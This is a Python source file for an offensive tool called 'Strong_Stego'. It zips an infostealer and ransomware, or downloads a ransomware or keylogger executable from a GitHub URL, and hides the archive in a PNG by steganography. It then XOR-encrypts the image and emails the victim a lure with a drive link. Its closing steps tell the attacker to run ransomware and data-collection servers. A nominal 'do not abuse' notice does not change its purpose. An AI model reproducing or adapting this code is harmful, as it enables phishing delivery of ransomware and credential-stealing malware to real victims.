from PIL import Image
import zipfile
from termcolor import colored
from random import randint
from colorama import Fore
from emoji import emojize
import webbrowser
import time
from random import choice
import requests
import pyfiglet
from sys import platform
import string
import os
import random
from tkinter import Y
from ctypes import resize
import numpy as np
import cv2
import matplotlib.pyplot as plt
from termcolor import colored
import re
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import os.path
import warnings,logging
from transformers import pipeline,set_seed
from IPython.display import Image
import os
import PyInstaller.__main__
import pytesseract
from IPython.display import Image
import os.path
import warnings,logging
from transformers import pipeline,set_seed
from IPython.display import Image
import os
import PyInstaller.__main__
import pytesseract 
from PIL import Image


random.seed(9)


# This Function Gets The Current Directory For The Running Script And Integrate It With The AppData Dir 
def current_Directory_With_AppData():
    current_dir = os.getcwd()
    file_path = current_dir + "\\AppData\\"
    return file_path


# This Function Shows The Words In The Top Of The Screan Such As [Done, Please_Wait, Getting_Ready,...] 
def pyfigletInCLI(name):
        os.system('cls')
        print("")
        Project_Name = pyfiglet.figlet_format(name)
        Project_Name_Color = colored(Project_Name, "green")
        print(Project_Name_Color)


# This Function Shows The Instruction When The Attacker Runs The Tool 
def Instuctions_In_The_First():
    os.system('cls')
    Project_Name = pyfiglet.figlet_format("\n\n          S t r o n g _ S t e g o")
    Project_Name_Color = colored(Project_Name, "green")
    print(Project_Name_Color)
    print(colored('\n\t      * Written by ', 'red'),end="")
    print(colored("Hussein Adel","yellow"),end="")
    print(colored(' & ', 'red'),end="" )
    print(colored("Shehab Ashraf","yellow"),end="")
    print(colored(' & ', 'red'),end="" )
    print(colored("Farouk Ashraf","yellow"),end=" ")
    print(colored(' & ', 'red'),end="" )
    print(colored("Mohamed Hassan","yellow"))
    print ("\t\t\t   ------------   -------------   -------------    --------------\n")
    print(Fore.WHITE + "  ------------------------------------------------")
    print(Fore.RED + emojize("  [#]"),end="")
    print(Fore.RED + ' Read The Following Instructions Carefully :- ')
    print(Fore.WHITE + "  ------------------------------------------------\n")
    print(Fore.YELLOW + " \t[1]",end="")
    print(Fore.GREEN + "\tDo Not Abuse This Tool ")
    print(Fore.YELLOW + " \t[2]",end="")
    print(Fore.GREEN + "  \tJust Use It For Good Purposes ")
    print(Fore.YELLOW + " \t[3]",end="")
    print(Fore.GREEN + "  \tIt Is Recommended That You Upload The Image With Its Extension ")
    print(Fore.YELLOW + " \t[4]",end="")
    print(Fore.GREEN + "  \tIt Is Recommended That You Upload The Malware With Its Extension ")
    print(Fore.YELLOW + " \t[5]",end="")
    print(Fore.GREEN + "  \tDon't Delete The DataApp Folder For This Tool ")
    print(Fore.YELLOW + " \t[6]",end="")
    print(Fore.GREEN + "  \tDon't Delete Any File From The DataApp For This Tool ")
    print(Fore.YELLOW + " \t[7]",end="")
    print(Fore.GREEN + "  \tDon't Rename Any File In The DataApp Folder For This Tool\n ")


# This Function Shows The Instruction When The Attacker Ends EveryThing And Starts To Leave 
def instruction_In_The_End():
    os.system('cls')
    Done = pyfiglet.figlet_format("\n\n                               D o n e\n\n\n")
    Done_Color = colored(Done, "blue")
    print(Done_Color)
    print(Fore.WHITE + "\t\t\t       -------------------------------\n")
    print(Fore.RED + emojize("  [#]"),end="")
    print(Fore.RED + ' Here Are Some Steps To Follow :- ')
    print(Fore.WHITE + "  -------------------------------------\n")
    print(Fore.YELLOW + " \t[1]",end="")
    print(Fore.GREEN + "\tRunning the 'Server_File' Script Finded in AppData\n ")
    print(Fore.YELLOW + " \t[2]",end="")
    print(Fore.GREEN + "  \tRunning the 'Server_Ransomware' Script Finded in AppData\n ")
    print(Fore.YELLOW + " \t[3]",end="")
    print(Fore.GREEN + "  \tIn the First Script 'Server_File' Don't Do Anything the Information\n\t\tWill Be Recieved and Stored in Appdata\n ")
    print(Fore.YELLOW + " \t[4]",end="")
    print(Fore.GREEN + "  \tIn the Second Script 'Server_Ransomware' You Must Enter the 'Key' \n\t\tand 'en' To Encrypt and 'de' To Decrypt\n")
    print(Fore.YELLOW + " \t[5]",end="")
    print(Fore.GREEN + "  \tDon't Close the Servers Atall Untill You Get What You Need\n\n\n ")


# This Function Zips The Two Malware Before Concealing Them In The Image 
def zipped_Malware_(paths,zip_file_path):
    py_file_path = paths[0]
    exe_file_path = paths[1]

    # Create a new zip file and add the input files to it
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.write(py_file_path,arcname=os.path.basename(py_file_path))
            zip_file.write(exe_file_path,arcname=os.path.basename(exe_file_path))


# This Function Zips The Two Malware Before Concealing Them In The Image 
def zipped_Malware(malware_Paths, zipped_Malware):
    with zipfile.ZipFile(zipped_Malware, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for file_path in malware_Paths:
            zip_file.write(file_path,arcname=os.path.basename(file_path)) 


# This Function Generates A Caption For The Image Then Generates Another Text From This Caption && extract text from this pic
def text_Socail_Engineering():
    warnings.simplefilter('ignore')
    logging.disable(logging.WARNING)
    caption = pipeline('image-to-text')
    generator = pipeline('text-generation', model='gpt2')
    appData_Path=current_Directory_With_AppData()
    img= os.path.join(appData_Path, 'original.png')
    text= caption(img)
    textFromImage=text[0]['generated_text']
    text2=generator(textFromImage, max_length=100, num_return_sequences=3)
    textToTex=text2[0]["generated_text"]
    image = Image.open(img)
    text2= pytesseract.image_to_string(image)
    textt=textToTex+text2
    return textt


# This Function Encrypts The Injected Image Before Sending It
def encrypt_Image():
    appData_Path=current_Directory_With_AppData()
    image_path= os.path.join(appData_Path, 'Image.png')
    key = 125
    rbin = open(image_path, 'rb')
    image = rbin.read()
    rbin.close()
    image = bytearray(image)
    for index, values in enumerate(image):
        image[index] = values ^ key
    wbin = open(image_path, 'wb')
    wbin.write(image)
    wbin.close()


# This Function Sends The Image And Text_Social_Engineering Via An Email
def email():

    try:
        def email_checker(attacker_Email):
            regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
            if(re.fullmatch(regex, attacker_Email)):
                print(Fore.YELLOW + " \n\t[!]",end="")
                print(Fore.GREEN + "  \tEnter The Password : ",end="")
                password=input()
                print(Fore.YELLOW + " \n\t[!]",end="")
                print(Fore.GREEN + "  \tEnter the Victim's Email : ",end="")
                victim_Email=input()
                #text1=text_Socail_Engineering()
                encrypt_Image()
                print(Fore.YELLOW + " \n\t[!]",end="")
                print(Fore.GREEN + "  \tEnter The Drive Link : ",end="")
                textt=input()
                if(re.fullmatch(regex, victim_Email)):
                    os.system('cls')
                    print("\n\n\n\n\n\n\n\n")
                    Project_Name = pyfiglet.figlet_format("\t           S e n d i n g   . . . . . . ")
                    Project_Name_Color = colored(Project_Name, "yellow")
                    print(Project_Name_Color)
                    smtp_port = 587
                    smtp_server = "smtp.gmail.com"
                    email_from = attacker_Email
                    email_list = [victim_Email]
                    pswd = password
                    subject = "This Is For You"
                    def send_emails(email_list):
                        for person in email_list:
                            body_Text = "\n\n this Picture has a lot of informatiom about this topic \n\nIf You Need More Just Download The Image And open It By Using The File Bellow Because It Is Protected\n\n"+textt
                            body = body_Text
                            msg = MIMEMultipart()
                            msg['From'] = email_from
                            msg['To'] = person
                            msg['Subject'] = subject
                            msg.attach(MIMEText(body, 'plain'))
                            text = msg.as_string()
                            TIE_server = smtplib.SMTP(smtp_server, smtp_port)
                            TIE_server.starttls()
                            TIE_server.login(email_from, pswd)
                            TIE_server.sendmail(email_from, person, text)
                        TIE_server.quit()
                        os.system('cls')
                        print("\n\n\n\n\n\n\n\n")
                        Project_Name = pyfiglet.figlet_format("\t                              D  o  n  e  ")
                        Project_Name_Color = colored(Project_Name, "yellow")
                        print(Project_Name_Color)
                        time.sleep(3)
                        os.system('cls')
                    send_emails(email_list)
                else:
                    print(Fore.RED + "  \n\t        The Victim's Email That You Entered Is Not Vaild\n  ",end="")
            else:
                print(Fore.RED + "  \n\t        Your Email That You Entered Is Not Vaild\n  ",end="")
        
        print(Fore.YELLOW + " \n\t[!]",end="")
        print(Fore.GREEN + "  \tEnter Your Email : ",end="")
        attacker_Email=input()
        email_checker(attacker_Email)
    except:
        os.system('cls')
        print("\n\n\n\n\n\n\n\n")
        Project_Name = pyfiglet.figlet_format("                            E  r  r  o  r  ! !   ")
        Project_Name_Color = colored(Project_Name, "red")
        print(Project_Name_Color)


# This Function Converts From Any Format To The Binary To Encode It In The Image
def Converting_To_Bin(content):
    if type(content)==str:
        return ''.join([format(ord(i),"08b")for i in content])
    elif type(content)==bytes or type(content)==np.ndarray:
        return ''.join([format(i,"08b")for i in content ])
    elif type(content)==int or type(content)==np.uint8:
        return ''.join(format(content,"08b"))
    else:
        print(" * Please, Enter Your data as Text")


# This Function Converts From Any Format To The Binary To Encode It In The Image
def Converting_To_Binn(contentt):
    if type(contentt)==str:
        return ''.join([format(ord(i),"08b")for i in contentt])
    elif type(contentt)==bytes or type(contentt)==np.ndarray:
        return [format(i,"08b")for i in contentt ]
    elif type(contentt)==int or type(contentt)==np.uint8:
        return format(contentt,"08b")
    else:
        print(" * Please, Enter Your data as Text")


# This Function Hides The Binary To Encode It In The Image
def hideData(pic,data):
    number_Of_Bytes=pic.shape[0]*pic.shape[1]*3   # there was a //8 
    if len(data)>number_Of_Bytes:
        print(" * Your Data must be less than this")
    data+='000000000000000000000000000000000000000000000000000000011111111111111111110000000000001111111111'
    #data="011011001100001000101111010001010100000000000001"
    data_index=0 
    binary_Message=[]
    for i in range(0, len(data), 2):
        pair = data[i:i+2]
        binary_Message.append(pair)
    binary_Message_len=len(binary_Message)
    for values in pic:
        for pixel in values:
            r,g,b = Converting_To_Binn(pixel)
            if data_index<binary_Message_len:
                numr = random.randint(7, 8)
                if r[0:2] != binary_Message[data_index] and r[2:4] != binary_Message[data_index]:
                    new_r = r[:5] + "0" + r[6:]
                    new_s = new_r[:-2] + binary_Message[data_index]
                else:
                    if r[0:2] == binary_Message[data_index]:
                        new_r = r[:5] + "1" + r[6:]
                        new_s = new_r[:numr-1] + "0" + new_r[numr:]
                    if r[2:4] == binary_Message[data_index]:
                        new_r = r[:5] + "1" + r[6:]
                        new_s = new_r[:numr-1] + "1" + new_r[numr:]   
                pixel[0]=int(new_s,2)
                data_index+=1
            else :
                break
            if data_index<binary_Message_len:
                numg = random.randint(7, 8)
                if g[0:2] != binary_Message[data_index] and g[2:4] != binary_Message[data_index]:
                    new_g = g[:5] + "0" + g[6:]
                    new_s = new_g[:-2] + binary_Message[data_index]
                else:
                    if g[0:2] == binary_Message[data_index]:
                        new_g = g[:5] + "1" + g[6:]
                        new_s = new_g[:numg-1] + "0" + new_g[numg:]
                    if g[2:4] == binary_Message[data_index]:
                        new_g = g[:5] + "1" + g[6:]
                        new_s = new_g[:numg-1] + "1" + new_g[numg:]         
                pixel[1]=int(new_s,2)
                data_index+=1
            else :
                break
            if data_index<binary_Message_len:
                numb = random.randint(7, 8)
                if b[0:2] != binary_Message[data_index] and b[2:4] != binary_Message[data_index]:
                    new_b = b[:5] + "0" + b[6:]
                    new_s = new_b[:-2] + binary_Message[data_index]
                else:
                    if b[0:2] == binary_Message[data_index]:
                        new_b = b[:5] + "1" + b[6:]
                        new_s = new_b[:numb-1] + "0" + new_b[numb:]
                    if b[2:4] == binary_Message[data_index]:
                        new_b = b[:5] + "1" + b[6:]
                        new_s = new_b[:numb-1] + "1" + new_b[numb:]        
                pixel[2]=int(new_s,2)
                data_index+=1
            else :
                break
        if data_index>=binary_Message_len:
            break
    return pic


# This Function Reads The Files (Images And Malware) Then Passes Them To The Hide_Data Function
def encode_data(original_Image,malware):
    image = cv2.imread(original_Image)
    #resized_image=cv2.resize(image,(500,500))
    #plt.imshow(cv2.cvtColor(image,cv2.COLOR_BGR2RGB))
    appData_Path=current_Directory_With_AppData()
    injected_Image_name= os.path.join(appData_Path, 'Image.png')
    with open (malware,"rb") as b:
        contenttt=b.read()
    def handle(dataa):
            if type(dataa)==bytes:
                return ''.join([format(i,"08b")for i in dataa ])
    dataa=handle(contenttt)
    injected_Image=hideData(image,dataa)
    cv2.imwrite(injected_Image_name,injected_Image)


# This Function To Choose If You Want Our Defaults Or Uploading Your Files
def choosing_Default_Or_Upload():
    while True:
        os.system('cls')
        pyfigletInCLI("                Getting _ Ready")
        print(Fore.YELLOW + " \n\t[D]",end="")
        print(Fore.GREEN + "  \tChoose Our Defaults ")
        print(Fore.YELLOW + " \n\t[U]",end="")
        print(Fore.GREEN + "  \tUpload Your Files ")
        print(Fore.CYAN + '\n  *',end="")
        y=input('  For Defaulting Enter [D] , For Uploading Enter [U] , To Exit Enter "X" > ')
        if y=="d" or y=="D":
            os.system('cls')
            print("\n\n\n\n\n\n\n\n")
            Project_Name = pyfiglet.figlet_format("       P l e a s e _ W a i t   . . . ")
            Project_Name_Color = colored(Project_Name, "yellow")
            print(Project_Name_Color)
            appData_Path=current_Directory_With_AppData()
            infostealer=appData_Path + "infostealer.py"
            ransomware=appData_Path+ 'ransomware.py'
            two_Malware_Paths = [infostealer, ransomware]
            zipped_Malware_name=appData_Path+ 'malware.zip'
            zipped_Malware(two_Malware_Paths,zipped_Malware_name)
            original_image_Appdata=appData_Path+ 'original.png'
            zipped_Malware_Path=appData_Path+'malware.zip'
            encode_data(original_image_Appdata,zipped_Malware_Path)
            pyfigletInCLI("                                        D o n e")
            print(Fore.YELLOW + "\n  \t* The Injected Image Was Saved In The AppData Directory With Name 'Image.png' \n\n")
            print(Fore.BLUE + "  \t* Now You Can Upload The Image.png And The Decrypt.exe In Your Drive Account \n\n")
            time.sleep(10)
            os.system('cls')
            pyfigletInCLI("                Sending _ Email")
            email()
            instruction_In_The_End()
            break
        elif y=="u" or y=="U":
            while True:
                var=0
                pyfigletInCLI("               Getting _ Malware")
                print(Fore.YELLOW + " \n\t[L]",end="")
                print(Fore.RED + "  \tLoading Malware Form Your Local Storage ")
                print(Fore.YELLOW + " \n\t[D]",end="")
                print(Fore.RED + "  \tSuggesting Malware Names And Downloading Them ")
                print(Fore.YELLOW + " \n\t[S]",end="")
                print(Fore.RED + "  \tSearching For Others On The Internet ")
                print(Fore.CYAN + '\n  *',end="")
                z=input('  Choose From [L] or [D] or [S] , To Exit Enter "X" > ')
                def download_Mal_From_Internet(mal_url):
                    r = requests.get(mal_url)
                    appData_Path=current_Directory_With_AppData()
                    malware_Name=os.path.join(appData_Path, 'mal.exe')
                    with open(malware_Name,'wb') as f:
                        f.write(r.content)
                if z=="L" or z=="l":
                    while True:
                        pyfigletInCLI("            Loading _ Malware")
                        print(Fore.CYAN +"\n   * Load Your Malware (Its Path And Extension Must Be '.exe or .py' ) , To Exit Enter 'X' >  ",end="")
                        load_Mal=input()
                        if os.path.isfile(load_Mal) and load_Mal.endswith(".exe") :
                            laoding_malware=load_Mal
                            var=10
                            print(Fore.RED + ' \n\n  *=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=* \n')     
                            break
                        elif os.path.isfile(load_Mal) and load_Mal.endswith(".py"):
                            laoding_malware=load_Mal
                            var=10
                            print(Fore.RED + ' \n\n  *=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=* \n')     
                            break
                        elif load_Mal=="x" or load_Mal=="X":
                            os.system('cls')
                            print("\n\n\n\n\n\n\n\n")
                            Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
                            Project_Name_Color = colored(Project_Name, "yellow")
                            print(Project_Name_Color)
                            time.sleep(4)
                            os.system('cls')
                            exit()
                        else:
                            print(Fore.RED + ' \n\n\t\t* Invalid Input "Check Either The Extension Or The Directory" \n')     
                            time.sleep(4) 
                elif z=="d" or z=="D":
                    while True:
                        pyfigletInCLI("      Suggested _ Malware")
                        print(Fore.GREEN +"\n\t [R]  Ransomware(Drakside)\n\n\t [I]  Keylogger(keylogger)\n")
                        print(Fore.YELLOW +"\n   # Once You Choose The Malware, It Will Be Downloaded In The AppData Directory With Name 'mal.exe'\n")
                        print(Fore.CYAN +"\n   *  Choose From [R] or [I] , To Exit Enter 'X' > ",end="")
                        mal=input()
                        if mal=="R" or mal=="r":
                            download_Mal_From_Internet("https://github.com/HusseinAdel7/malwares_Project/raw/main/Ransomware.exe")
                            appData_Path=current_Directory_With_AppData()
                            downloaded_Malware_Name=os.path.join(appData_Path, 'mal.exe')
                            laoding_malware=downloaded_Malware_Name
                            var=10
                            break
                        elif mal=="i" or mal=="I":
                            download_Mal_From_Internet("https://github.com/HusseinAdel7/malwares_Project/raw/main/Keylogger.exe")
                            appData_Path=current_Directory_With_AppData()
                            downloaded_Malware_Name=os.path.join(appData_Path, 'mal.exe')
                            laoding_malware=downloaded_Malware_Name
                            var=10
                            break
                        elif mal=="x" or mal=="X":
                            os.system('cls')
                            print("\n\n\n\n\n\n\n\n")
                            Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
                            Project_Name_Color = colored(Project_Name, "yellow")
                            print(Project_Name_Color)
                            time.sleep(4)
                            os.system('cls')
                            exit()
                        else:
                            print(Fore.RED + ' \n\t* Invalid Input  \n')
                            time.sleep(1)
                elif z=="s" or z=="S":
                    pyfigletInCLI("Downloading_Malware")
                    print (Fore.GREEN +"\n\t https://bazaar.abuse.ch/browse/tag/malware/")
                    print(Fore.GREEN +"\n\t https://app.any.run/submissions/")
                    print(Fore.YELLOW +"\n\n * Choose One Of Them Or You're Gonna Redirect To One Of Them After 10 Seconds ")
                    print(Fore.YELLOW +"\n * Note ==> Download The Malware As (.Exe ) and Put It In The AppData Directory 'Must'   ")
                    time.sleep(10)
                    websites = ['https://app.any.run/submissions/','https://bazaar.abuse.ch/browse/tag/malware/']
                    webbrowser.open(choice(websites))
                    while True:
                        pyfigletInCLI("Downloading_Malware")
                        print (Fore.GREEN +"\n\t https://bazaar.abuse.ch/browse/tag/malware/")
                        print(Fore.GREEN +"\n\t https://app.any.run/submissions/")
                        print(Fore.YELLOW +"\n\n * Choose One Of Them Or You're Gonna Redirect To One Of Them After 10 Seconds ")
                        print(Fore.YELLOW +"\n * Note ==> Download The Malware As (.Exe ) and Put It In The AppData Directory 'Must'   ")
                        print(Fore.CYAN +"\n * Download It In DataApp With Name 'mal.exe' If You Did Enter 'Y' , To Exit Enter 'X' >  ",end="")
                        yy=input()
                        if yy =='y' or yy=='Y':
                            appData_Path=current_Directory_With_AppData()
                            downloaded_Malware_N=os.path.join(appData_Path, 'mal.exe')
                            laoding_malware=downloaded_Malware_N
                            var=10
                            break
                        elif yy=="x" or yy=="X":
                            os.system('cls')
                            print("\n\n\n\n\n\n\n\n")
                            Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
                            Project_Name_Color = colored(Project_Name, "yellow")
                            print(Project_Name_Color)
                            time.sleep(2)
                            os.system('cls')
                            exit()
                        else:
                            print(Fore.RED + ' \n\t\t * Invalid Input \n  ')
                            time.sleep(2)
                elif z=="x" or z=="X":
                    os.system('cls')
                    print("\n\n\n\n\n\n\n\n")
                    Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
                    Project_Name_Color = colored(Project_Name, "yellow")
                    print(Project_Name_Color)
                    time.sleep(4)
                    os.system('cls')
                    exit()
                else:
                    print(Fore.RED + ' \n\t    * Invalid Input \n  ')
                    time.sleep(2)
                if var==10:
                    Project_Name = pyfiglet.figlet_format("\n\n               Loading _ Image")
                    Project_Name_Color = colored(Project_Name, "yellow")
                    print(Project_Name_Color)
                    while True:
                        print(Fore.CYAN +"\n   * Load Your Image (Its Path And Extension prefer ('.png') , To Exit Enter 'X':  ",end="")
                        load_img=input()
                        if os.path.isfile(load_img) and load_img.endswith(".png"):
                            laoding_img=load_img
                            break
                        elif os.path.isfile(load_img) and load_img[-4:] !=".png":
                            jpg_image = cv2.imread(load_img)
                            appData_Path=current_Directory_With_AppData()
                            saved_Image=os.path.join(appData_Path, 'imgFromxToPng.png')
                            cv2.imwrite(saved_Image,jpg_image)
                            laoding_img=saved_Image
                            break
                        elif load_img=="x" or load_img=="X":
                            os.system('cls')
                            print("\n\n\n\n\n\n\n\n")
                            Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
                            Project_Name_Color = colored(Project_Name, "yellow")
                            print(Project_Name_Color)
                            time.sleep(4)
                            os.system('cls')
                            exit()
                        else:
                            print(Fore.RED + ' \n\n\t\t\t* Invalid Input \n')
                            time.sleep(2)
                    os.system('cls')
                    print("\n\n\n\n\n\n\n\n")
                    Project_Name = pyfiglet.figlet_format("       P l e a s e _ W a i t   . . . ")
                    Project_Name_Color = colored(Project_Name, "yellow")
                    print(Project_Name_Color)
                    appData_Path=current_Directory_With_AppData()
                    default_Malware_Infostealer=os.path.join(appData_Path, 'infostealer.py') # Change It To infostealer.py
                    default_Malware=default_Malware_Infostealer
                    file_paths = [default_Malware, laoding_malware]
                    zip_name = os.path.join(appData_Path, 'malware.zip')
                    zipped_Malware_(file_paths,zip_name)
                    #zipped_Malware(file_paths,zip_name)
                    archived_Malware=zip_name
                    encode_data(laoding_img,archived_Malware)
                    pyfigletInCLI("                                        D o n e")
                    print(Fore.YELLOW + "\n  \t* The Injected Image Was Saved In The AppData Directory With Name 'Image.png' \n\n")
                    print(Fore.BLUE + "  \t* Now You Can Upload The Image.png And The Decrypt.exe In Your Drive Account \n\n")
                    time.sleep(10)
                    os.system('cls')
                    pyfigletInCLI("                Sending _ Email")
                    email()
                    instruction_In_The_End()
                    break
            break           
        elif y=="x" or y=="X":
            os.system('cls')
            print("\n\n\n\n\n\n\n\n")
            Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
            Project_Name_Color = colored(Project_Name, "yellow")
            print(Project_Name_Color)
            time.sleep(2)
            os.system('cls')
            exit()
        else:
            print(Fore.RED + ' \n\n\t\t\t  * Invalid Input \n')
            time.sleep(1)


def clean():
    appData_Path=current_Directory_With_AppData()
    # specify the name of the file to be deleted
    #injected_image = os.path.join(appData_Path, 'injected.png')
    malware_zip =os.path.join(appData_Path, 'malware.zip') 
    mal_exe = os.path.join(appData_Path, 'mal.exe') 
    dow_Mal_ext = os.path.join(appData_Path, 'dow_Mal.exe') 
    injected_image = os.path.join(appData_Path, 'Image.png') 
    file_List=[mal_exe,malware_zip,dow_Mal_ext,injected_image]
    for file_name in file_List:
        # check if the file exists
        if os.path.exists(file_name):
            # delete the file
            os.remove(file_name)
        else:
            continue


# This Function Shows EveyThing On CLI Screan
def CLI_Show():
    
    while True:
        Instuctions_In_The_First()
        print(Fore.CYAN + ' * If You Read The Instructions Well Please Enter "Y" , To Exit Enter "X" > ',end="")
        x=input()
        if x=="y" or x=="Y":
            choosing_Default_Or_Upload()
            break
        elif x=="x" or x=="X":
            os.system('cls')
            print("\n\n\n\n\n\n\n\n")
            Project_Name = pyfiglet.figlet_format("                            T  h  a  n  k  s  ")
            Project_Name_Color = colored(Project_Name, "yellow")
            print(Project_Name_Color)
            time.sleep(2)
            os.system('cls')
            exit()
        else:
            print(Fore.RED + ' \n\t\t\t* Invalid Input \n')
            time.sleep(1)
    clean()


# This Function Calls All Functions
CLI_Show()